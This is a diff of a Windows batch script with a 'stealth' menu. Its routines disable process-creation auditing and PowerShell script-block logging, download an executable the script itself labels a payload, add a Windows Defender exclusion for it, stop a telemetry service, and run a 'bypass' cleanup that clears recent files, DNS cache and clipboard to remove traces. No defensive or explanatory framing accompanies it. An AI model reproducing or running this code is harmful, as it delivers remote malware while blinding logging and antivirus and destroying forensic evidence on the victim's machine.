@@ -153,47 +153,68 @@ echo Invalid choice. Try again.
 timeout /t 2 /nobreak >nul
 goto STEALTH_MENU
 
-:SETUP
+:DisableAuditLogs
 echo Disabling process creation auditing...
 auditpol /set /subcategory:"Process Creation" /success:disable /failure:disable >nul 2>&1
+exit /b
 
-echo Disabling PowerShell logging...
-reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f >nul 2>&1
-reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging" /v EnableModuleLogging /t REG_DWORD /d 0 /f >nul 2>&1
+:EnableAuditLogs
+echo Re-enabling process creation auditing...
+auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable >nul 2>&1
+exit /b
 
-echo Disabling Windows Defender real-time protection...
-powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
+:DisablePowerShellLogging
+echo Disabling PowerShell script block logging...
+reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v "EnableScriptBlockLogging" /t REG_DWORD /d 0 /f >nul 2>&1
+exit /b
+
+:EnablePowerShellLogging
+echo Enabling PowerShell script block logging...
+reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v "EnableScriptBlockLogging" /t REG_DWORD /d 1 /f >nul 2>&1
+exit /b
+
+:AddDefenderExclusion
+echo Adding Defender exclusion for the EXE...
+powershell -Command "Add-MpPreference -ExclusionPath '%SETUP_EXE%'" >nul 2>&1
+exit /b
+
+:RemoveDefenderExclusion
+echo Removing Defender exclusion for the EXE...
+powershell -Command "Remove-MpPreference -ExclusionPath '%SETUP_EXE%'" >nul 2>&1
+exit /b
+
+:SETUP
+call :DisableAuditLogs
+call :DisablePowerShellLogging
 
 echo STEP 1: Preparing download...
 timeout /t 1 >nul
 echo STEP 2: Connecting to GitHub...
 timeout /t 1 >nul
 echo STEP 3: Downloading payload (CAXVN.exe)...
-
 powershell -Command "$client = New-Object System.Net.WebClient; $client.DownloadFile('%EXE_URL%', '%SETUP_EXE%')"
 
 if exist "%SETUP_EXE%" (
     echo Download successful.
+    call :AddDefenderExclusion
 ) else (
     echo Failed to download EXE.
     pause
+    call :EnableAuditLogs
+    call :EnablePowerShellLogging
     goto STEALTH_MENU
 )
 
-echo Re-enabling Windows Defender real-time protection...
-powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1
-
-echo Re-enabling PowerShell logging...
-reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging" /v EnableModuleLogging /t REG_DWORD /d 1 /f >nul 2>&1
-
-echo Re-enabling process creation auditing...
-auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable >nul 2>&1
-
+call :EnableAuditLogs
+call :EnablePowerShellLogging
 pause
 goto STEALTH_MENU
 
 :RUN
+echo Disabling Data Usage Service...
+sc stop dmwappushservice >nul 2>&1
+sc config dmwappushservice start= disabled >nul 2>&1
+
 echo Preparing disguised EXE...
 
 if not exist "%SETUP_EXE%" (
@@ -218,6 +239,10 @@ pause
 goto STEALTH_MENU
 
 :BYPASS
+echo Enabling Data Usage Service...
+sc config dmwappushservice start= auto >nul 2>&1
+sc start dmwappushservice >nul 2>&1
+
 echo Running cleanup...
 
 :: Clear recent files
@@ -241,15 +266,8 @@ ipconfig /flushdns >nul
 :: Clear clipboard
 echo off | clip
 
-:: Re-enable process creation auditing in case disabled
-auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable >nul 2>&1
-
-:: Re-enable PowerShell logging
-reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging" /v EnableModuleLogging /t REG_DWORD /d 1 /f >nul 2>&1
-
-:: Re-enable Windows Defender real-time protection
-powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1
+:: Re-enable Defender exclusion removal
+call :RemoveDefenderExclusion
 
 echo Cleanup done. All traces removed.
 pause
